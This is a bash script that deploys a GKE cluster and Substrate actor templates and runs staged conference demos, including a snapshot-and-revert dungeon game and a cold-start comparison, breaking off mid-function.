#!/usr/bin/env bash
# Copyright 2026 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Live-stage runner & GKE deployer for the "Running Anything But Agents on Substrate" talk.
#
# Usage:
#   ./hack/stage-demo.sh bootstrap-gke   # Provision GKE cluster (default: us-west3 SLC), install Substrate & deploy all 5 demos
#   ./hack/stage-demo.sh deploy          # Build & deploy WorkerPool + all 5 ActorTemplates onto current cluster
#   ./hack/stage-demo.sh run-all         # Run all 5 demos in sequence
#   ./hack/stage-demo.sh act1-dungeon    # Live Demo 1: "Look Ma, No Database" + Save-Scumming (revert & tag)
#   ./hack/stage-demo.sh act1b-dungeon2d # Live Demo 1B: 2D Multilevel Dungeon + Live Mission-Control Dashboard
#   ./hack/stage-demo.sh act2-coldstart  # Live Demo 2: "The Instant Cloner" (12s cold boot -> 100ms clones)
#   ./hack/stage-demo.sh act3-tenantdb   # Live Demo 3: "One DB Per User" (DurableDir + FULLPause/DATACommit)
#   ./hack/stage-demo.sh act4-honeypot   # Live Demo 4: "The Truman Show Honeypot" (per-IP gVisor deception)
#   ./hack/stage-demo.sh act5-timewarp   # Live Demo 5: "Don't Try This at Home" (Time-Jump & Raft Split-Brain)
#   ./hack/stage-demo.sh cleanup         # Tear down demo actors, templates, and WorkerPool

set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ATESPACE="anything-but-agents"
ROUTER_URL="${ROUTER_URL:-http://localhost:8000}"
PAUSE_BETWEEN_STEPS="${PAUSE_BETWEEN_STEPS:-1}"
export PATH="${HOME}/.local/go/bin:/usr/bin/go/bin:${HOME}/google-cloud-sdk/bin:${HOME}/go/bin:${HOME}/.local/bin:${PATH}"
export PATH="$(go env GOPATH)/bin:${PATH}"

# Load local .env if present; fall back to worktree parent .env or parent .ate-dev-env.sh if present.
if [[ -f "${REPO_ROOT}/.env" ]]; then
  # shellcheck disable=SC1091
  source "${REPO_ROOT}/.env"
elif [[ -f "${REPO_ROOT}/../../.env" ]]; then
  # shellcheck disable=SC1091
  source "${REPO_ROOT}/../../.env"
elif [[ -f "${REPO_ROOT}/../.ate-dev-env.sh" ]]; then
  # shellcheck disable=SC1091
  source "${REPO_ROOT}/../.ate-dev-env.sh"
fi

# Apply defaults tuned for Salt Lake City (us-west3) once PROJECT_ID is known.
apply_env_defaults() {
  if [[ -z "${PROJECT_ID:-}" ]]; then
    echo "Error: PROJECT_ID is not set." >&2
    echo "Copy .env.example to .env and set your GCP PROJECT_ID:" >&2
    echo "  cp .env.example .env" >&2
    exit 1
  fi

  export GCE_REGION="${GCE_REGION:-us-west3}"
  export CLUSTER_LOCATION="${CLUSTER_LOCATION:-${GCE_REGION}-a}"
  export CLUSTER_NAME="${CLUSTER_NAME:-anything-but-agents}"
  export NODE_MACHINE_TYPE="${NODE_MACHINE_TYPE:-c3-standard-4}"
  export ENABLE_NESTED_VIRTUALIZATION="${ENABLE_NESTED_VIRTUALIZATION:-true}"
  export NETWORK="${NETWORK:-default}"
  export SUBNETWORK="${SUBNETWORK:-default}"
  export BUCKET_NAME="${BUCKET_NAME:-ate-snapshots-${PROJECT_ID}-${GCE_REGION}}"
  export KO_DOCKER_REPO="${KO_DOCKER_REPO:-gcr.io/${PROJECT_ID}/anything-but-agents}"
  export DEMO_DOMAIN="${DEMO_DOMAIN:-substrate.learngke.dev}"
  export GATEWAY_IP_NAME="${GATEWAY_IP_NAME:-substrate-learngke-ip}"
  export CERT_MAP_NAME="${CERT_MAP_NAME:-substrate-learngke-map}"
  if [[ -z "${ATE_CREDENTIAL_PROVIDER:-}" ]]; then
    export ATE_CREDENTIAL_PROVIDER='{"name":"k8s.io"}'
  fi
  export KO_DEFAULTPLATFORMS="${KO_DEFAULTPLATFORMS:-linux/amd64}"
  if [[ -z "${SUBSTRATE_ROOT:-}" ]]; then
    for candidate in \
      "${REPO_ROOT}/.." \
      "${REPO_ROOT}/../../agent-substrate/substrate" \
      "${REPO_ROOT}/../../agent-substrate/b-substrate" \
      "${REPO_ROOT}/../../../../agent-substrate/substrate" \
      "${REPO_ROOT}/../../../../agent-substrate/b-substrate"; do
      if [[ -d "${candidate}/tools/setup-gcp" ]]; then
        SUBSTRATE_ROOT="$(cd "${candidate}" && pwd)"
        break
      fi
    done
    export SUBSTRATE_ROOT="${SUBSTRATE_ROOT:-$(cd "${REPO_ROOT}/.." && pwd)}"
  fi

  # Isolate KUBECONFIG and CLOUDSDK_CONFIG so concurrent sessions on the same
  # machine cannot switch current-context or race on gcloud SQLite/log files.
  local src_kubeconfig="${KUBECONFIG:-${HOME}/.kube/config}"
  local isolated_kubeconfig="/tmp/kubeconfig-${CLUSTER_NAME}"
  if [[ -f "${src_kubeconfig}" && "${src_kubeconfig}" != "${isolated_kubeconfig}" ]]; then
    cp "${src_kubeconfig}" "${isolated_kubeconfig}"
    export KUBECONFIG="${isolated_kubeconfig}"
  fi
  local src_gcloud="${CLOUDSDK_CONFIG:-${HOME}/.config/gcloud}"
  local isolated_gcloud="/tmp/gcloud-${CLUSTER_NAME}"
  if [[ -d "${src_gcloud}" && "${src_gcloud}" != "${isolated_gcloud}" ]]; then
    if [[ ! -d "${isolated_gcloud}" ]]; then
      cp -r "${src_gcloud}" "${isolated_gcloud}" 2>/dev/null || true
    fi
    if [[ -d "${isolated_gcloud}" ]]; then
      export CLOUDSDK_CONFIG="${isolated_gcloud}"
    fi
  fi
  local target_ctx="${KUBE_CONTEXT:-gke_${PROJECT_ID}_${CLUSTER_LOCATION}_${CLUSTER_NAME}}"
  kubectl config use-context "${target_ctx}" >/dev/null 2>&1 || true
}

if [[ -n "${PROJECT_ID:-}" ]]; then
  apply_env_defaults
fi

banner() {
  echo ""
  echo -e "\033[1;36m================================================================================\033[0m"
  echo -e "\033[1;36m  $*\033[0m"
  echo -e "\033[1;36m================================================================================\033[0m"
}

step() {
  echo ""
  echo -e "\033[1;33m>>> $*\033[0m"
  if [[ "${PAUSE_BETWEEN_STEPS}" == "1" ]]; then
    read -r -p "    [Press Enter to execute] " _
  fi
}

run_cmd() {
  echo -e "\033[1;32m$ $*\033[0m"
  "$@"
}

resolve_gke_version() {
  if [[ -n "${CLUSTER_VERSION:-}" ]]; then
    return
  fi
  # Pick the latest 1.36.* or 1.37.* GKE version served in CLUSTER_LOCATION
  # (Agent Substrate requires Kubernetes 1.36+ for PodCertificateRequest / ClusterTrustBundle).
  local detected
  detected="$(gcloud container get-server-config \
    --project="${PROJECT_ID}" \
    --zone="${CLUSTER_LOCATION}" \
    --format="value(validMasterVersions)" 2>/dev/null \
    | tr ';' '\n' \
    | grep -E '^1\.(36|37)\.' \
    | head -n 1 || true)"
  export CLUSTER_VERSION="${detected:-1.36.4-gke.1495000}"
}

bootstrap_gke() {
  apply_env_defaults
  if [[ ! -d "${SUBSTRATE_ROOT}/tools/setup-gcp" ]]; then
    echo "Error: SUBSTRATE_ROOT (${SUBSTRATE_ROOT}) does not contain tools/setup-gcp." >&2
    echo "Set SUBSTRATE_ROOT in .env to point to your agent-substrate checkout." >&2
    exit 1
  fi

  banner "Bootstrapping GKE Cluster in ${CLUSTER_LOCATION} (Region: ${GCE_REGION})"
  export PROJECT_NUMBER="${PROJECT_NUMBER:-$(gcloud projects describe "${PROJECT_ID}" --format="value(projectNumber)")}"
  resolve_gke_version

  echo "Configuration:"
  echo "  PROJECT_ID                   = ${PROJECT_ID} (${PROJECT_NUMBER})"
  echo "  GCE_REGION                   = ${GCE_REGION} (Salt Lake City = us-west3)"
  echo "  CLUSTER_LOCATION             = ${CLUSTER_LOCATION}"
  echo "  CLUSTER_NAME                 = ${CLUSTER_NAME}"
  echo "  CLUSTER_VERSION              = ${CLUSTER_VERSION}"
  echo "  NODE_MACHINE_TYPE            = ${NODE_MACHINE_TYPE}"
  echo "  ENABLE_NESTED_VIRTUALIZATION = ${ENABLE_NESTED_VIRTUALIZATION}"
  echo "  BUCKET_NAME                  = ${BUCKET_NAME}"
  echo "  KO_DOCKER_REPO               = ${KO_DOCKER_REPO}"

  (
    cd "${SUBSTRATE_ROOT}"
    go run ./tools/setup-gcp bootstrap \
      --project-id="${PROJECT_ID}" \
      --project-number="${PROJECT_NUMBER}" \
      --region="${GCE_REGION}" \
      --cluster-name="${CLUSTER_NAME}" \
      --cluster-location="${CLUSTER_LOCATION}" \
      --cluster-version="${CLUSTER_VERSION}" \
      --machine-type="${NODE_MACHINE_TYPE}" \
      --enable-nested-virtualization="${ENABLE_NESTED_VIRTUALIZATION}" \
      --network="${NETWORK}" \
      --subnetwork="${SUBNETWORK}" \
      --bucket-name="${BUCKET_NAME}"

    gcloud container clusters get-credentials "${CLUSTER_NAME}" \
      --location="${CLUSTER_LOCATION}" \
      --project="${PROJECT_ID}"

    # Disable node auto-upgrade on the worker pool so GKE maintenance doesn't
    # evict running actors mid-demo.
    gcloud container node-pools update substrate-node-pool \
      --cluster="${CLUSTER_NAME}" \
      --location="${CLUSTER_LOCATION}" \
      --project="${PROJECT_ID}" \
      --no-enable-autoupgrade || true

    go install ./cmd/kubectl-ate

    local allowed_spiffe="spiffe://cluster.local/ns/anything-but-agents/sa/default,spiffe://cluster.local/ns/anything-but-agents/sa/dungeon2d-gateway,spiffe://cluster.local/ns/anything-but-agents/sa/coldstart-gateway,spiffe://cluster.local/ns/anything-but-agents/sa/tenantdb-gateway,spiffe://cluster.local/ns/anything-but-agents/sa/honeypot-gateway,spiffe://cluster.local/ns/anything-but-agents/sa/timewarp-gateway"

    go run ./cmd/ate-setup deploy ate-system \
      --snapshot-location="gs://${BUCKET_NAME}/" \
      --snapshot-transfer-gsa-name="ate-snapshot-transfer" \
      --gcp-project-id="${PROJECT_ID}" \
      --credential-provider="${ATE_CREDENTIAL_PROVIDER}" \
      --ingress-allowed-spiffe-ids="${allowed_spiffe}"

    go run ./cmd/ate-setup publish worker-images
  )

  deploy_all
}

detect_cluster_defaults() {
  if [[ -n "${PROJECT_ID:-}" ]]; then
    apply_env_defaults
  fi
  if [[ -z "${BUCKET_NAME:-}" ]]; then
    echo "Error: BUCKET_NAME (or PROJECT_ID in .env) must be set." >&2
    exit 1
  fi
  if [[ -z "${SUBSTRATE_VERSION:-}" ]]; then
    SUBSTRATE_VERSION="$(kubectl get nodes -o jsonpath='{.items[0].metadata.labels.ate\.dev/substrate-version}' 2>/dev/null || true)"
  fi
  if [[ -z "${ATEOM_GVISOR_IMAGE:-}" ]]; then
    # Discover an existing gvisor worker image from the cluster if one is already deployed,
    # or build it from SUBSTRATE_ROOT.
    ATEOM_GVISOR_IMAGE="$(kubectl get workerpools -A -o jsonpath='{.items[0].spec.workerImage}' 2>/dev/null || true)"
    if [[ "${ATEOM_GVISOR_IMAGE}" == *"/ateom-gvisor"* && -d "${SUBSTRATE_ROOT:-}/cmd/ateworker-gvisor" ]]; then
      ATEOM_GVISOR_IMAGE=""
    fi
    if [[ -z "${ATEOM_GVISOR_IMAGE}" && -n "${SUBSTRATE_ROOT:-}" ]]; then
      if [[ -d "${SUBSTRATE_ROOT}/cmd/ateworker-gvisor" ]]; then
        echo "Building ateworker-gvisor worker image via ko..."
        ATEOM_GVISOR_IMAGE="$(cd "${SUBSTRATE_ROOT}" && ko build ./cmd/ateworker-gvisor)"
      elif [[ -d "${SUBSTRATE_ROOT}/cmd/ateom-gvisor" ]]; then
        echo "Building ateom-gvisor worker image via ko..."
        ATEOM_GVISOR_IMAGE="$(cd "${SUBSTRATE_ROOT}" && ko build ./cmd/ateom-gvisor)"
      fi
    fi
  fi
  export DEMO_DOMAIN="${DEMO_DOMAIN:-substrate.learngke.dev}"
  export GATEWAY_IP_NAME="${GATEWAY_IP_NAME:-substrate-learngke-ip}"
  export CERT_MAP_NAME="${CERT_MAP_NAME:-substrate-learngke-map}"
  export BUCKET_NAME SUBSTRATE_VERSION ATEOM_GVISOR_IMAGE DEMO_DOMAIN GATEWAY_IP_NAME CERT_MAP_NAME
}

wait_for_template_golden_snapshot() {
  local tmpl="$1"
  echo "Waiting for '${tmpl}' Golden Snapshot to become READY..."
  for ((i = 1; i <= 90; i++)); do
    local yaml_out golden_ts err_msg
    yaml_out="$(kubectl ate get actor-template "${tmpl}" -a "${ATESPACE}" -o yaml 2>/dev/null || true)"
    golden_ts="$(echo "${yaml_out}" | awk '/snapshotTime:|takeGoldenSnapshotAt:/ {print $2; exit}')"
    err_msg="$(echo "${yaml_out}" | awk -F': ' '/errorMessage:/ {print $2; exit}')"
    if [[ -n "${golden_ts}" ]] || grep -q "goldenTag:" <<< "${yaml_out}"; then
      echo "  [READY] ${tmpl} (snapshot ready at: ${golden_ts:-ready})"
      return 0
    fi
    if [[ -n "${err_msg}" && "${err_msg}" != '""' ]]; then
      echo "  [ERROR] ${tmpl}: ${err_msg}" >&2
      return 1
    fi
    sleep 2
  done
  echo "  [TIMEOUT] Waiting for Golden Snapshot of ${tmpl}" >&2
  return 1
}

ensure_template_ready() {
  local tmpl="$1"
  local yaml_out
  yaml_out="$(kubectl ate get actor-template "${tmpl}" -a "${ATESPACE}" -o yaml 2>/dev/null || true)"
  if [[ "${FORCE_REBUILD_TEMPLATES:-0}" != "1" ]] && grep -qE "goldenTag:|snapshotTime:|takeGoldenSnapshotAt:" <<< "${yaml_out}"; then
    echo "ActorTemplate '${tmpl}' Golden Snapshot is already READY."
    return 0
  fi
  kubectl ate delete actor-template "${tmpl}" -a "${ATESPACE}" 2>/dev/null || true
  (
    cd "${REPO_ROOT}"
    envsubst < "manifests/${tmpl}-template.yaml.tmpl" \
      | ko resolve -f - \
      | kubectl ate create actor-template -f -
  )
  wait_for_template_golden_snapshot "${tmpl}"
}

deploy_all() {
  detect_cluster_defaults
  banner "Deploying 'Anything But Agents' WorkerPool & 6 ActorTemplates"

  echo "Using BUCKET_NAME=${BUCKET_NAME}"
  echo "Using SUBSTRATE_VERSION=${SUBSTRATE_VERSION}"
  echo "Using ATEOM_GVISOR_IMAGE=${ATEOM_GVISOR_IMAGE}"
  echo "Using KO_DOCKER_REPO=${KO_DOCKER_REPO:-}"

  if kubectl get workerpool anything-but-agents -n anything-but-agents >/dev/null 2>&1; then
    local existing_sc
    existing_sc="$(kubectl get workerpool anything-but-agents -n anything-but-agents -o jsonpath='{.spec.sandboxClasses[0].name}' 2>/dev/null || true)"
    if [[ -z "${existing_sc}" ]]; then
      echo "Replacing legacy pre-v0.5.0 WorkerPool anything-but-agents..."
      kubectl delete workerpool anything-but-agents -n anything-but-agents --ignore-not-found
    fi
  fi

  envsubst < "${REPO_ROOT}/manifests/workerpool.yaml.tmpl" | kubectl apply -f -
  kubectl rollout status deployment/anything-but-agents -n anything-but-agents --timeout=300s

  if ! kubectl get secret dungeon2d-gateway -n anything-but-agents >/dev/null 2>&1; then
    kubectl create secret generic dungeon2d-gateway \
      -n anything-but-agents \
      --from-literal=PRESENTER_TOKEN="$(openssl rand -hex 24)"
  fi

  kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true

  for actor in hero-mofi hero-timeline-b d2d-mofi d2d-mofi-timeline-b clone-1 clone-2 clone-3 coldstart-1 coldstart-2 coldstart-3 db-acme db-globex db-initech db-umbrella honeypot-203-0-113-5 honeypot-198-51-100-9 honeypot-forensic-lab raft-leader-1 raft-node-1 raft-node-2 raft-node-3; do
    kubectl ate delete actor "${actor}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl ate delete tag before-dragon -a "${ATESPACE}" 2>/dev/null || true

  for tmpl in dungeon dungeon2d coldstart tenantdb honeypot timewarp; do
    echo ""
    echo "--- Building & registering ActorTemplate: ${tmpl} ---"
    kubectl ate delete actor-template "${tmpl}" -a "${ATESPACE}" 2>/dev/null || true
    (
      cd "${REPO_ROOT}"
      envsubst < "manifests/${tmpl}-template.yaml.tmpl" \
        | ko resolve -f - \
        | kubectl ate create actor-template -f -
    )
    wait_for_template_golden_snapshot "${tmpl}"
  done

  echo ""
  kubectl ate get actor-templates -a "${ATESPACE}"
}

ensure_router_port_forward() {
  if ! curl -s -o /dev/null --connect-timeout 1 "${ROUTER_URL}/" 2>/dev/null; then
    local router_http_port
    router_http_port="$(kubectl get svc atenet-router -n ate-system -o jsonpath='{.spec.ports[?(@.port==80)].port}' 2>/dev/null || true)"
    if [[ "${router_http_port}" == "80" ]]; then
      echo "Starting background port-forward to svc/atenet-router on ${ROUTER_URL}..."
      kubectl port-forward -n ate-system svc/atenet-router 8000:80 >/dev/null 2>&1 &
    else
      if ! kubectl get deployment dungeon2d-gateway -n anything-but-agents >/dev/null 2>&1; then
        deploy_dungeon2d_gateway
      fi
      echo "Starting background mTLS bridge port-forward via deploy/dungeon2d-gateway on ${ROUTER_URL}..."
      kubectl port-forward -n anything-but-agents deploy/dungeon2d-gateway 8000:8000 >/dev/null 2>&1 &
    fi
    PORT_FORWARD_PID=$!
    trap 'kill "${PORT_FORWARD_PID:-}" "${GATEWAY_PID:-}" 2>/dev/null || true' EXIT
    for _ in {1..20}; do
      if curl -s -o /dev/null --connect-timeout 1 "${ROUTER_URL}/" 2>/dev/null; then
        break
      fi
      sleep 0.5
    done
  fi
}

# Release all worker pods in the shared 3-replica WorkerPool by suspending any
# RUNNING, RESUMING, or PAUSED actors in the atespace.
free_workers() {
  local active_actors
  active_actors="$(kubectl ate get actors -a "${ATESPACE}" 2>/dev/null \
    | awk '$4 == "ACTOR_STATE_RUNNING" || $4 == "ACTOR_STATE_RESUMING" || $4 == "ACTOR_STATE_PAUSED" || ($1 != "ATESPACE" && $5 != "" && $5 != "<none>") {print $2}' || true)"
  for actor in ${active_actors}; do
    echo "Suspending active actor '${actor}' to free worker capacity..."
    kubectl ate suspend actor "${actor}" -a "${ATESPACE}" >/dev/null 2>&1 || true
  done
}

# Reset specific actors (and optional tag:<name> entries) before an act starts
# so every act can be run or re-run independently in any order.
reset_act_resources() {
  for resource in "$@"; do
    case "${resource}" in
      tag:*)
        local tag_name="${resource#tag:}"
        kubectl ate delete tag "${tag_name}" -a "${ATESPACE}" >/dev/null 2>&1 || true
        ;;
      *)
        kubectl ate delete actor "${resource}" -a "${ATESPACE}" >/dev/null 2>&1 || true
        ;;
    esac
  done
  free_workers
}

act1_dungeon() {
  ensure_router_port_forward
  banner "ACT I: 'Look Ma, No Database' — Zork Dungeon in Pure Process RAM"
  reset_act_resources hero-mofi hero-timeline-b tag:before-dragon

  step "1. Create hero actor 'hero-mofi' from the 'dungeon' template"
  run_cmd kubectl ate create actor hero-mofi -a "${ATESPACE}" --template dungeon

  step "2. Wake the actor with an HTTP request & look around the Tavern"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=look"

  step "3. Move to the Armory and pick up ONLY the dragon-slayer-sword (forgetting the fire-shield!)"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=move+armory"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=take+dragon-slayer-sword"

  step "4. Move into the Cavern of the Heap Dragon"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=move+dragon-lair"

  step "5. QUICKSAVE! Suspend the actor to GCS (persisting Go heap variables) and tag the snapshot 'before-dragon'"
  run_cmd kubectl ate suspend actor hero-mofi -a "${ATESPACE}" --mode=sync
  run_cmd kubectl ate create tag before-dragon -a "${ATESPACE}" --actor hero-mofi

  step "6. Recklessly attack the Heap Dragon without the fire-shield -> YOU DIE (PlayerHP = 0 in RAM)"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=attack"

  step "7. SAVE-SCUMMING! Revert the running actor back to its last external snapshot (kubectl ate revert)"
  run_cmd kubectl ate revert actor hero-mofi -a "${ATESPACE}"
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=look"

  step "8. Bonus: Fork a parallel timeline ('hero-timeline-b') from the 'before-dragon' tag!"
  run_cmd kubectl ate create actor hero-timeline-b -a "${ATESPACE}" --template dungeon --tag before-dragon
  run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/hero-timeline-b" "${ROUTER_URL}/?cmd=move+armory"

  free_workers
}

act1b_dungeon2d() {
  ensure_router_port_forward
  banner "ACT I-B: 'Save-Scumming the Heap Dragon (2D Edition)' — Mobile 2D Game & Live Dashboard"
  reset_act_resources d2d-mofi d2d-mofi-timeline-b

  local gateway_port="${DUNGEON2D_PORT:-8090}"
  local gateway_url="http://localhost:${gateway_port}"
  local presenter_token
  presenter_token="$(kubectl get secret dungeon2d-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' 2>/dev/null | base64 -d || true)"
  if [[ -z "${presenter_token}" ]]; then
    presenter_token="$(openssl rand -hex 24)"
  fi

  echo "Starting dungeon2d Gateway & Live Mission-Control Dashboard on ${gateway_url}..."
  (
    cd "${REPO_ROOT}"
    PRESENTER_TOKEN="${presenter_token}" go run ./cmd/dungeon2d \
      --mode=gateway \
      --addr=":${gateway_port}" \
      --atespace="${ATESPACE}" \
      --template=dungeon2d \
      --router-url="${ROUTER_URL}" >/dev/null 2>&1
  ) &
  GATEWAY_PID=$!
  trap 'kill "${PORT_FORWARD_PID:-}" "${GATEWAY_PID:-}" 2>/dev/null || true' EXIT

  for _ in {1..30}; do
    if curl -s -o /dev/null --connect-timeout 1 "${gateway_url}/readyz" 2>/dev/null; then
      break
    fi
    sleep 0.3
  done

  echo ""
  echo "  Projector Mission-Control Dashboard : ${gateway_url}/dashboard?key=\$(kubectl get secret dungeon2d-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo "  Player 2D Mobile Game Frontend      : ${gateway_url}/play"
  echo ""

  step "1. Start 2D hero session 'mofi' (Paladin, 140 HP, 8-Floor Campaign) -> Wakes actor on WorkerPool, initializes Floor 1 WorldState (v1), and suspends to GCS"
  run_cmd curl -fsS -X POST "${gateway_url}/api/session/start" -d '{"hero_name":"mofi","character_class":"paladin"}'

  step "2. Client simulates Floors 1-4 locally at 60fps, then saves Floor 4 Clockwork Foundry WorldState (v2) to GCS"
  run_cmd curl -fsS -X POST "${gateway_url}/api/session/action" -d '{"actor_name":"d2d-mofi","action":"save_world","label":"Floor 4 Clockwork Foundry Cleared","world":{"floor":4,"max_floors":8,"hero":{"x":16,"y":8,"hp":118,"max_hp":140,"armor":25,"character_class":"paladin","equipped_weapon":"sunblade-greatsword","equipped_relic":"chrono-sigil","potions":2,"gold":290,"score":740,"inventory":["crypt-key","sunblade-greatsword","chrono-sigil","healing-potion"]}}}'

  step "3. Floor 6 (Vault of Forking Paths) & Floor 7 (Obsidian Gauntlet): unlock Sunforged Vault and activate Pre-Boss Save Shrine (v3)"
  run_cmd curl -fsS -X POST "${gateway_url}/api/session/action" -d '{"actor_name":"d2d-mofi","action":"quicksave","target":"f7:shrine","label":"Floor 7 Obsidian Gauntlet Pre-Boss Shrine","world":{"floor":7,"max_floors":8,"hero":{"x":18,"y":8,"hp":140,"max_hp":140,"armor":35,"character_class":"paladin","equipped_weapon":"dragon-slayer-sword","equipped_armor":"sunforged-aegis","equipped_relic":"chrono-sigil","potions":3,"gold":620,"score":1680,"inventory":["crypt-key","dragon-slayer-sword","sunforged-aegis","chrono-sigil"]}}}'

  step "4. Floor 8 Boss Fight: charge the Ancient Heap Dragon without Fire Shield -> YOU DIE (Alive=false in RAM)!"
  run_cmd curl -fsS -X POST "${gateway_url}/api/session/action" -d '{"actor_name":"d2d-mofi","action":"combat","target":"Ancient Heap Dragon","entity_id":"f8:dragon"}'

  step "5. SAVE-SCUM! Revert actor directly back to Snapshot v3 (Floor 7 Pre-Boss Shrine) via kubectl ate revert"
  run_cmd curl -fsS -X POST "${gateway_url}/api/session/revert" -d '{"actor_name":"d2d-mofi","target_version":3}'

  step "6. Equip Fire Shield + Sunforged Aegis, slay the Ancient Heap Dragon on Floor 8, claim the Golden Chalice, and escape!"
  run_cmd curl -fsS -X POST "${gateway_url}/api/session/action" -d '{"actor_name":"d2d-mofi","action":"victory","label":"Floor 8 Ancient Heap Dragon Slain & Sanctum Escaped","world":{"floor":8,"max_floors":8,"hero":{"x":11,"y":1,"hp":96,"max_hp":140,"armor":45,"character_class":"paladin","equipped_weapon":"dragon-slayer-sword","equipped_armor":"sunforged-aegis","equipped_relic":"chrono-sigil","potions":1,"gold":950,"score":2650,"inventory":["crypt-key","dragon-slayer-sword","fire-shield","sunforged-aegis","chrono-sigil","golden-chalice"]}}}'

  step "7. Fork a parallel timeline ('d2d-mofi-timeline-b') from the tagged snapshot!"
  run_cmd curl -fsS -X POST "${gateway_url}/api/session/fork" -d '{"source_actor":"d2d-mofi","new_actor":"d2d-mofi-timeline-b"}'

  if [[ "${PAUSE_BETWEEN_STEPS}" == "1" ]]; then
    echo ""
    echo ">>> Dashboard (${gateway_url}/dashboard?key=${presenter_token}) and 2D Game (${gateway_url}/play) are still live!"
    read -r -p "    [Press Enter when finished exploring the browser UI] " _
  fi

  kill "${GATEWAY_PID:-}" 2>/dev/null || true
  free_workers
}

deploy_dungeon2d_gateway() {
  detect_cluster_defaults
  banner "Deploying In-Cluster Dungeon 2D Gateway & LoadBalancer"

  kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true

  if ! kubectl get secret dungeon2d-gateway -n anything-but-agents >/dev/null 2>&1; then
    kubectl create secret generic dungeon2d-gateway \
      -n anything-but-agents \
      --from-literal=PRESENTER_TOKEN="$(openssl rand -hex 24)"
  fi

  # Ensure ActorTemplate dungeon2d is up to date
  ensure_template_ready dungeon2d

  if [[ -z "${KUBECTL_ATE_IMAGE:-}" ]]; then
    if [[ -n "${SUBSTRATE_ROOT:-}" && -d "${SUBSTRATE_ROOT}" ]]; then
      echo "Building kubectl-ate container image from ${SUBSTRATE_ROOT}..."
      KUBECTL_ATE_IMAGE="$(
        cd "${SUBSTRATE_ROOT}"
        KO_CONFIG_PATH="${REPO_ROOT}/.ko.yaml" ko build ./cmd/kubectl-ate --platform=linux/amd64
      )"
    else
      echo "ERROR: Set KUBECTL_ATE_IMAGE or SUBSTRATE_ROOT to deploy dungeon2d-gateway." >&2
      exit 1
    fi
  fi
  export KUBECTL_ATE_IMAGE

  (
    cd "${REPO_ROOT}"
    envsubst < "manifests/dungeon2d-gateway.yaml.tmpl" \
      | ko resolve --platform=linux/amd64 -f - \
      | kubectl apply -f -
  )
  kubectl rollout status deployment/dungeon2d-gateway -n anything-but-agents --timeout=120s

  local lb_ip=""
  for _ in {1..30}; do
    lb_ip="$(kubectl get svc dungeon2d-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"
    if [[ -n "${lb_ip}" ]]; then
      break
    fi
    sleep 2
  done

  echo ""
  echo "  Player 2D Game URL (HTTPS)   : https://dungeon.${DEMO_DOMAIN}/play"
  echo "  Presenter Dashboard (HTTPS)  : https://dungeon.${DEMO_DOMAIN}/dashboard?key=\$(kubectl get secret dungeon2d-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo "  Player 2D Game URL (LB IP)   : http://${lb_ip:-<pending>}/play"
  echo ""
}

cleanup_dungeon2d_gateway() {
  banner "Cleaning up Dungeon 2D Gateway Deployment & Actors"
  for act in $(kubectl ate get actors -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^d2d-/ {print $2}' || true); do
    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
  done
  for tag in $(kubectl ate get tags -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^tag-d2d-/ {print $2}' || true); do
    kubectl ate delete tag "${tag}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl delete deployment,service,secret,serviceaccount dungeon2d-gateway -n anything-but-agents --ignore-not-found
  kubectl delete role,rolebinding dungeon2d-gateway-token-minter -n ate-system --ignore-not-found
  kubectl delete clusterrole,clusterrolebinding dungeon2d-gateway-ate-client --ignore-not-found
  free_workers
}

deploy_coldstart_hpa() {
  detect_cluster_defaults
  banner "Deploying Cold-Start HPA vs. Substrate Golden Snapshot HPA Comparison Stack"

  kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true
  free_workers

  if ! kubectl get secret coldstart-gateway -n anything-but-agents >/dev/null 2>&1; then
    kubectl create secret generic coldstart-gateway \
      -n anything-but-agents \
      --from-literal=PRESENTER_TOKEN="$(openssl rand -hex 24)"
  fi

  # Ensure ActorTemplate coldstart is up to date
  ensure_template_ready coldstart

  for i in 1 2 3; do
    kubectl ate delete actor "coldstart-${i}" -a "${ATESPACE}" 2>/dev/null || true
    kubectl ate create actor "coldstart-${i}" -a "${ATESPACE}" --template coldstart
    if [[ "${i}" -gt 1 ]]; then
      kubectl ate suspend actor "coldstart-${i}" -a "${ATESPACE}" 2>/dev/null || true
    fi
  done

  if [[ -z "${KUBECTL_ATE_IMAGE:-}" ]]; then
    KUBECTL_ATE_IMAGE="$(kubectl get deployment dungeon2d-gateway -n anything-but-agents -o jsonpath='{.spec.template.spec.initContainers[0].image}' 2>/dev/null || true)"
  fi
  if [[ -z "${KUBECTL_ATE_IMAGE:-}" ]]; then
